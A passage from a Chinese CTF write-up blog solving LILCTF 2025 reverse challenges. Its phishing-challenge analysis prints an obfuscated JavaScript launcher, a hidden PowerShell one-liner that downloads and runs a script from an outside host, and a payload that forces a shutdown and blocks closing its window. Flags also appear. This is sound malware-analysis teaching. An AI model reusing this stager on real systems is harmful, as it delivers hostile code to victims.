alt="image-20250923202721944"></p><p>然后就是恢复image.jpg了，</p><p>选择image.jpg &gt; 工具 &gt; 恢复加密卷头信息 &gt; 选择你保存的那个备份加密卷 &gt; 输入密码</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509232039810.png" alt="image-20250923203900760"></p><p>And_Y0u_M4ster_The_VeraCrypt_H34der_Trick!}</p>]]></content>
    
    
    <categories>
      
      <category>Misc比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LILCTF2025逆向题解</title>
    <link href="/2025/08/28/LILCTF2025%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/"/>
    <url>/2025/08/28/LILCTF2025%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="LILCTF-2025"><a href="#LILCTF-2025" class="headerlink" title="LILCTF 2025"></a>LILCTF 2025</h1><h2 id="ARM-ASM"><a href="#ARM-ASM" class="headerlink" title="ARM ASM"></a>ARM ASM</h2><p>先用jadx看，找到密文</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508231925628.png" alt="img"></p><p>反编译so文件，找到主函数，这里一共分为三处加密，第一处通过t表进行重新排列和按位xor，第二处对每三字节进行左循环移3位，右循环移1位，不变的变换，第三处用base64变表的加密</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508231925646.png" alt="img"></p><p>这里可以找到t表的内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508231926445.png" alt="img"></p><p>将以上加密过程逆过来写解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python">CUSTOM = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ3456780129+/&quot;</span><br><br>decode_map = &#123;ch:i <span class="hljs-keyword">for</span> i,ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(CUSTOM)&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_b64decode</span>(<span class="hljs-params">s</span>):<br>    out = <span class="hljs-built_in">bytearray</span>()<br>    buf=[]; pad=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> ch == <span class="hljs-string">&#x27;=&#x27;</span>:<br>            pad += <span class="hljs-number">1</span>; buf.append(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            buf.append(decode_map[ch])<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(buf)==<span class="hljs-number">4</span>:<br>            b0 = (buf[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">2</span>) | (buf[<span class="hljs-number">1</span>]&gt;&gt;<span class="hljs-number">4</span>)<br>            b1 = ((buf[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xF</span>)&lt;&lt;<span class="hljs-number">4</span>) | (buf[<span class="hljs-number">2</span>]&gt;&gt;<span class="hljs-number">2</span>)<br>            b2 = ((buf[<span class="hljs-number">2</span>]&amp;<span class="hljs-number">3</span>)&lt;&lt;<span class="hljs-number">6</span>) | buf[<span class="hljs-number">3</span>]<br>            out.extend([b0,b1,b2])<br>            buf=[]<br>    <span class="hljs-keyword">if</span> pad: out = out[:-pad]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror</span>(<span class="hljs-params">x,r</span>): <span class="hljs-keyword">return</span> ((x&gt;&gt;r) | ((x &amp; ((<span class="hljs-number">1</span>&lt;&lt;r)-<span class="hljs-number">1</span>))&lt;&lt;(<span class="hljs-number">8</span>-r))) &amp; <span class="hljs-number">0xFF</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rol</span>(<span class="hljs-params">x,r</span>): <span class="hljs-keyword">return</span> ((x&lt;&lt;r) | (x&gt;&gt;(<span class="hljs-number">8</span>-r))) &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inv_neon_block</span>(<span class="hljs-params">Y, t</span>):<br>    z = [ y ^ (t[k] &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-keyword">for</span> k,y <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(Y) ]<br>    X = [<span class="hljs-number">0</span>]*<span class="hljs-number">16</span><br>    <span class="hljs-keyword">for</span> k,j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(t):<br>        X[j] = z[k]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(X)<br><br>enc = <span class="hljs-string">&quot;KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S&quot;</span><br><br>data = custom_b64decode(enc)<br><br>buf = <span class="hljs-built_in">list</span>(data)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">3</span>):<br>    buf[j]   = ror(buf[j],   <span class="hljs-number">3</span>)<br>    buf[j+<span class="hljs-number">1</span>] = rol(buf[j+<span class="hljs-number">1</span>], <span class="hljs-number">1</span>)<br>after_neon = <span class="hljs-built_in">bytes</span>(buf)<br><br><br>t0 = [<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x0B</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x06</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>]<br>t2 = [v ^ <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> t0]<br><br>X0 = inv_neon_block(after_neon[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>],  t0)<br>X1 = inv_neon_block(after_neon[<span class="hljs-number">16</span>:<span class="hljs-number">32</span>], t0)<br>X2 = inv_neon_block(after_neon[<span class="hljs-number">32</span>:<span class="hljs-number">48</span>], t2)<br><br>orig = (X0+X1+X2).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-built_in">print</span>(orig)<br><span class="hljs-comment"># -&gt; LILCTF&#123;ez_arm_asm_meow_meow_meow_meow_meow_meow&#125;</span><br></code></pre></td></tr></table></figure><h2 id="1’M-no7-A-rO6oT"><a href="#1’M-no7-A-rO6oT" class="headerlink" title="1’M no7 A rO6oT"></a>1’M no7 A rO6oT</h2><p>用vs看文本内容，得到看到这一串js代码，提取出来，发现这一段有好多混淆，这里我是利用python一步步解混淆的，可以直接梭，由于代码太长就不贴出来了</p><p>这是初始代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">resizeTo</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">moveTo</span>(-<span class="hljs-number">9999</span>, -<span class="hljs-number">9999</span>); <span class="hljs-variable constant_">SK</span>=<span class="hljs-number">102</span>;<span class="hljs-variable constant_">UP</span>=<span class="hljs-number">117</span>;tV=<span class="hljs-number">110</span>;<span class="hljs-title class_">Fx</span>=<span class="hljs-number">99</span>;nI=<span class="hljs-number">116</span>;pV=<span class="hljs-number">105</span>;wt=<span class="hljs-number">111</span>;<span class="hljs-variable constant_">RV</span>=<span class="hljs-number">32</span>;wV=<span class="hljs-number">82</span>;<span class="hljs-title class_">Rp</span>=<span class="hljs-number">106</span>;kz=<span class="hljs-number">81</span>;<span class="hljs-variable constant_">CX</span>=<span class="hljs-number">78</span>;<span class="hljs-variable constant_">GH</span>=<span class="hljs-number">40</span>;<span class="hljs-variable constant_">PS</span>=<span class="hljs-number">70</span>;<span class="hljs-variable constant_">YO</span>=<span class="hljs-number">86</span>;kF=<span class="hljs-number">75</span>;<br>......<br><span class="hljs-built_in">eval</span>(<span class="hljs-title class_">SxhM</span>); <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">close</span>();&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>解出第一步，中间内容省略（太长了）</p><p>这里贴出解出第一步代码的主要逻辑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ioRjQN</span>(<span class="hljs-params">FVKq</span>)&#123;<br>    <span class="hljs-keyword">var</span> ohyLbg= <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> emGK = <span class="hljs-number">0</span>; emGK &lt; <span class="hljs-title class_">FVKq</span>.<span class="hljs-property">length</span>; emGK++)&#123;<br>        <span class="hljs-keyword">var</span> ndZC = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-title class_">FVKq</span>[emGK] - <span class="hljs-number">601</span>);<br>        ohyLbg = ohyLbg + ndZC<br>    &#125;<br>    <span class="hljs-keyword">return</span> ohyLbg<br>&#125;;<br><br><span class="hljs-keyword">var</span> ohyLbg = <span class="hljs-title function_">ioRjQN</span>([<span class="hljs-number">713</span>, <span class="hljs-number">712</span>, <span class="hljs-number">720</span>, ... , <span class="hljs-number">642</span>]);<br><span class="hljs-comment">// 这里 ohyLbg 就是被解密出来的实际 payload</span><br><br><span class="hljs-keyword">var</span> emGK = <span class="hljs-title function_">ioRjQN</span>([<span class="hljs-number">688</span>,<span class="hljs-number">684</span>,<span class="hljs-number">700</span>,<span class="hljs-number">715</span>,<span class="hljs-number">706</span>,<span class="hljs-number">713</span>,<span class="hljs-number">717</span>,<span class="hljs-number">647</span>,<span class="hljs-number">684</span>,<span class="hljs-number">705</span>,<span class="hljs-number">702</span>,<span class="hljs-number">709</span>,<span class="hljs-number">709</span>]);<br><span class="hljs-comment">// 这里解密出来的是一个 ActiveX 对象名字，例如 &quot;WScript.Shell&quot;</span><br><br><span class="hljs-keyword">var</span> ioRjQN = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(emGK);<br>ioRjQN.<span class="hljs-title class_">Run</span>(ohyLbg, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);<br><br></code></pre></td></tr></table></figure><p>第二层解出是一个powershell命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-w</span> <span class="hljs-number">1</span> <span class="hljs-literal">-ep</span> Unrestricted <span class="hljs-literal">-nop</span> `<br><span class="hljs-variable">$EFTE</span> = (<br>  [<span class="hljs-type">regex</span>]::Matches(<br>    <span class="hljs-string">&#x27;a5a9b49fb8adbe...（一大串16进制字符）...&#x27;</span>, <span class="hljs-string">&#x27;.&#123;2&#125;&#x27;</span><br>  ) | % &#123;<br>    [<span class="hljs-built_in">char</span>]([<span class="hljs-type">Convert</span>]::ToByte(<span class="hljs-variable">$_</span>.Value,<span class="hljs-number">16</span>) <span class="hljs-operator">-bxor</span> <span class="hljs-string">&#x27;204&#x27;</span>)<br>  &#125;<br>) <span class="hljs-operator">-join</span> <span class="hljs-string">&#x27;&#x27;</span>;<br><br>&amp; <span class="hljs-variable">$EFTE</span>.Substring(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>) <span class="hljs-variable">$EFTE</span>.Substring(<span class="hljs-number">3</span>)<br><br></code></pre></td></tr></table></figure><p>十六进制字符串 (<code>a5a9b49fb8adbe...</code>)被正则分成 2 位一组（即 <code>&quot;a5&quot;</code>, <code>&quot;a9&quot;</code>, <code>&quot;b4&quot;</code>…）。</p><p>转成字节再异或 204</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[<span class="hljs-symbol">Convert</span>]:<span class="hljs-link">:ToByte($_.Value,16) -bxor 204</span><br></code></pre></td></tr></table></figure><p>拼接成字符串，得到一个完整的命令&#x2F;脚本，赋值给 <code>$EFTE</code>。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&amp; <span class="hljs-variable">$EFTE</span><span class="hljs-selector-class">.Substring</span>(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>) <span class="hljs-variable">$EFTE</span><span class="hljs-selector-class">.Substring</span>(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><ul><li>拿 <code>$EFTE</code> 前 3 个字符作为程序名（可能是 <code>&quot;cmd&quot;</code> 或 <code>&quot;iex&quot;</code>）。</li><li>剩下部分是参数&#x2F;脚本。</li><li>最后动态执行。</li></ul><p>解密这一层得到第三层代码，</p><p>这段代码在隐藏窗口下启动powershell，然后执行’http:&#x2F;&#x2F;…&#x2F;bestudding.jpg，我们可以直接在浏览器窗口下载这个jpg</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">iex</span><span class="hljs-built_in">Start-Process</span> <span class="hljs-string">&quot;<span class="hljs-variable">$env:SystemRoot</span>\SysWOW64\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span> <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&#x27;-w&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;-ep&#x27;</span>,<span class="hljs-string">&#x27;Unrestricted&#x27;</span>,<span class="hljs-string">&#x27;-Command&#x27;</span>,<span class="hljs-string">&quot;Set-Variable 3 &#x27;http://challenge.xinshi.fun:40341/bestudding.jpg&#x27;;SI Variable:/Z4D &#x27;Net.WebClient&#x27;;cd;SV c4H (.<span class="hljs-variable">$ExecutionContext</span>.InvokeCommand.((<span class="hljs-variable">$ExecutionContext</span>.InvokeCommand|Get-Member)[2].Name).Invoke(<span class="hljs-variable">$ExecutionContext</span>.InvokeCommand.((<span class="hljs-variable">$ExecutionContext</span>.InvokeCommand|Get-Member|Where&#123;(GV _).Value.Name-clike&#x27;*dName&#x27;&#125;).Name).Invoke(&#x27;Ne*ct&#x27;,1,1))(LS Variable:/Z4D).Value);SV A ((((Get-Variable c4H -ValueO)|Get-Member)|Where&#123;(GV _).Value.Name-clike&#x27;*wn*d*g&#x27;&#125;).Name);&amp;([ScriptBlock]::Create((Get-Variable c4H -ValueO).((Get-Variable A).Value).Invoke((Variable 3 -Val))))&quot;</span>;<br></code></pre></td></tr></table></figure><p>将图片用vs打开查看文本内容，得到这么一串</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">(<span class="hljs-string">&#x27;(&#x27;</span> | % &#123; <span class="hljs-variable">$r</span> = + <span class="hljs-variable">$</span>() &#125; &#123; <span class="hljs-variable">$u</span> = <span class="hljs-variable">$r</span> &#125; &#123; <span class="hljs-variable">$b</span> = ++ <span class="hljs-variable">$r</span> &#125; &#123; <span class="hljs-variable">$q</span> = ( <span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$z</span> = ( <span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$o</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$d</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$h</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$e</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$i</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$x</span> = (<span class="hljs-variable">$q</span> *( <span class="hljs-variable">$z</span>) ) &#125; &#123; <span class="hljs-variable">$l</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span>) &#125; &#123; <span class="hljs-variable">$g</span> = <span class="hljs-string">&quot;[&quot;</span> + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123; &#125;)&quot;</span>[<span class="hljs-variable">$e</span> ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123; &#125;)&quot;</span>[ <span class="hljs-string">&quot;<span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>&quot;</span> ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123; &#125; ) &quot;</span>[ <span class="hljs-string">&quot;<span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>&quot;</span> ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>?&quot;</span>[<span class="hljs-variable">$b</span> ] + <span class="hljs-string">&quot;]&quot;</span> &#125; &#123; <span class="hljs-variable">$r</span> = <span class="hljs-string">&quot;&quot;</span>.(<span class="hljs-string">&quot;<span class="hljs-variable">$</span>( @&#123;&#125; ) &quot;</span>[ <span class="hljs-string">&quot;<span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>&quot;</span> ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123;&#125;) &quot;</span>[ <span class="hljs-string">&quot;<span class="hljs-variable">$b</span><span class="hljs-variable">$h</span>&quot;</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>( @&#123; &#125; )&quot;</span>[<span class="hljs-variable">$u</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123;&#125; )&quot;</span>[<span class="hljs-variable">$o</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>? &quot;</span>[ <span class="hljs-variable">$b</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>( @&#123;&#125;)&quot;</span>[<span class="hljs-variable">$z</span> ]) &#125; &#123; <span class="hljs-variable">$r</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123; &#125; )&quot;</span>[ <span class="hljs-string">&quot;<span class="hljs-variable">$b</span>&quot;</span> + <span class="hljs-string">&quot;<span class="hljs-variable">$o</span>&quot;</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123; &#125;) &quot;</span>[<span class="hljs-variable">$o</span> ] + <span class="hljs-string">&quot;<span class="hljs-variable">$r</span>&quot;</span>[<span class="hljs-string">&quot;<span class="hljs-variable">$q</span>&quot;</span> + <span class="hljs-string">&quot;<span class="hljs-variable">$e</span>&quot;</span> ] &#125; ) ; <span class="hljs-string">&quot; <span class="hljs-variable">$r</span> (<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>......</span><br></code></pre></td></tr></table></figure><p>这一串就是加密的过程，<code>$r</code> 是核心变量。</p><p>最终结果</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$DebugPreference</span> = <span class="hljs-variable">$ErrorActionPreference</span> = <span class="hljs-variable">$VerbosePreference</span> = <span class="hljs-variable">$WarningPreference</span> = <span class="hljs-string">&quot;SilentlyContinue&quot;</span><br><br>[<span class="hljs-built_in">void</span>] [<span class="hljs-type">System.Reflection.Assembly</span>]::LoadWithPartialName(<span class="hljs-string">&quot;System.Windows.Forms&quot;</span>)<br>[<span class="hljs-built_in">void</span>] [<span class="hljs-type">System.Reflection.Assembly</span>]::LoadWithPartialName(<span class="hljs-string">&quot;System.Drawing&quot;</span>)<br><br>shutdown /s /t <span class="hljs-number">600</span> &gt;<span class="hljs-variable">$Null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><br><span class="hljs-variable">$Form</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Form<br><span class="hljs-variable">$Form</span>.Text = <span class="hljs-string">&quot;Ciallo～(∠·ω&lt; )⌒★&quot;</span><br><span class="hljs-variable">$Form</span>.StartPosition = <span class="hljs-string">&quot;Manual&quot;</span><br><span class="hljs-variable">$Form</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">40</span>, <span class="hljs-number">40</span>)<br><span class="hljs-variable">$Form</span>.Size = <span class="hljs-built_in">New-Object</span> System.Drawing.Size(<span class="hljs-number">720</span>, <span class="hljs-number">480</span>)<br><span class="hljs-variable">$Form</span>.MinimalSize = <span class="hljs-built_in">New-Object</span> System.Drawing.Size(<span class="hljs-number">720</span>, <span class="hljs-number">480</span>)<br><span class="hljs-variable">$Form</span>.MaximalSize = <span class="hljs-built_in">New-Object</span> System.Drawing.Size(<span class="hljs-number">720</span>, <span class="hljs-number">480</span>)<br><span class="hljs-variable">$Form</span>.FormBorderStyle = <span class="hljs-string">&quot;FixedDialog&quot;</span><br><span class="hljs-variable">$Form</span>.BackColor = <span class="hljs-string">&quot;#0077CC&quot;</span><br><span class="hljs-variable">$Form</span>.MaximizeBox = <span class="hljs-variable">$False</span><br><span class="hljs-variable">$Form</span>.TopMost = <span class="hljs-variable">$True</span><br><br><br><span class="hljs-variable">$fF1IA49G</span> = <span class="hljs-string">&quot;LILCTF&#123;be_vigilant_against_phishing&#125;&quot;</span><br><span class="hljs-variable">$fF1IA49G</span> = <span class="hljs-string">&quot;N0pe&quot;</span><br><br><br><span class="hljs-variable">$Label1</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Label<br><span class="hljs-variable">$Label1</span>.Text = <span class="hljs-string">&quot;:)&quot;</span><br><span class="hljs-variable">$Label1</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">64</span>, <span class="hljs-number">80</span>)<br><span class="hljs-variable">$Label1</span>.AutoSize = <span class="hljs-variable">$True</span><br><span class="hljs-variable">$Label1</span>.ForeColor = <span class="hljs-string">&quot;White&quot;</span><br><span class="hljs-variable">$Label1</span>.Font = <span class="hljs-built_in">New-Object</span> System.Drawing.Font(<span class="hljs-string">&quot;Consolas&quot;</span>, <span class="hljs-number">64</span>)<br><br><span class="hljs-variable">$Label2</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Label<br><span class="hljs-variable">$Label2</span>.Text = <span class="hljs-string">&quot;这里没有 flag；这个窗口是怎么出现的呢，flag 就在那里&quot;</span><br><span class="hljs-variable">$Label2</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">64</span>, <span class="hljs-number">240</span>)<br><span class="hljs-variable">$Label2</span>.AutoSize = <span class="hljs-variable">$True</span><br><span class="hljs-variable">$Label2</span>.ForeColor = <span class="hljs-string">&quot;White&quot;</span><br><span class="hljs-variable">$Label2</span>.Font = <span class="hljs-built_in">New-Object</span> System.Drawing.Font(<span class="hljs-string">&quot;微软雅黑&quot;</span>, <span class="hljs-number">16</span>)<br><br><span class="hljs-variable">$Label3</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Label<br><span class="hljs-variable">$Label3</span>.Text = <span class="hljs-string">&quot;你的电脑将在 10 分钟后关机，请保存你的工作&quot;</span><br><span class="hljs-variable">$Label3</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">64</span>, <span class="hljs-number">300</span>)<br><span class="hljs-variable">$Label3</span>.AutoSize = <span class="hljs-variable">$True</span><br><span class="hljs-variable">$Label3</span>.ForeColor = <span class="hljs-string">&quot;White&quot;</span><br><span class="hljs-variable">$Label3</span>.Font = <span class="hljs-built_in">New-Object</span> System.Drawing.Font(<span class="hljs-string">&quot;微软雅黑&quot;</span>, <span class="hljs-number">16</span>)<br><br><span class="hljs-variable">$Form</span>.Controls.AddRange(<span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$Label1</span>, <span class="hljs-variable">$Label2</span>, <span class="hljs-variable">$Label3</span>))<br><br><span class="hljs-variable">$Form</span>.Add_Shown(&#123;<span class="hljs-variable">$Form</span>.Activate()&#125;)<br><span class="hljs-variable">$Form</span>.Add_FormClosing(&#123;<br>    <span class="hljs-variable">$_</span>.Cancel = <span class="hljs-variable">$True</span><br>    [<span class="hljs-type">System.Windows.Forms.MessageBox</span>]::Show(<span class="hljs-string">&quot;不允许关闭！&quot;</span>, <span class="hljs-string">&quot;提示&quot;</span>, [<span class="hljs-type">System.Windows.Forms.MessageBoxButtons</span>]::OK, [<span 